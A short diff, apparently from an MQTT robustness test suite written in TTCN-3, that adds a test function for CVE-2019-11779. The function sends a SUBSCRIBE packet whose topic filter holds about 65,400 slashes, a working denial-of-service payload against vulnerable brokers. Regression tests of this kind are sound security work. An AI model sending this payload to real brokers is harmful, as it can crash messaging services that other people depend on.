@@ -939,6 +939,27 @@
    }
 
    /*
+   * @ref https://www.cvedetails.com/cve/CVE-2019-11779/
+   */
+   function f_send_subscribe_cve_2019_11779() runs on MQTT_Client_MTC
+   {
+     var integer v_packet_id := f_random_packet_id()
+     var QoS v_qos := AT_MOST_ONCE_DELIVERY
+     var universal charstring v_topic_filter := "/"
+
+     for(var integer i := 0; i < 65400; i := i + 1)
+     {
+       v_topic_filter := v_topic_filter & "/"
+     }
+
+     var template MQTT_v3_1_1_SubscribePayload v_subscribe_payload := m_subscribe_payload(v_topic_filter, v_qos)
+     var MQTT_v3_1_1_SubscribePayloadList v_subscribe_payload_list := {valueof(v_subscribe_payload)}
+     var template MQTT_v3_1_1_Subscribe v_subscribe := m_subscribe_packet(v_packet_id, v_subscribe_payload_list)
+
+     f_send_subscribe(connection, valueof(v_subscribe))
+   }
+
+   /*
     * Send a publish message with a ZERO WIDTH NO-BREAK SPACE within the the topic
     */
    function f_send_publish_zwnbs_01() runs on MQTT_Client_MTC
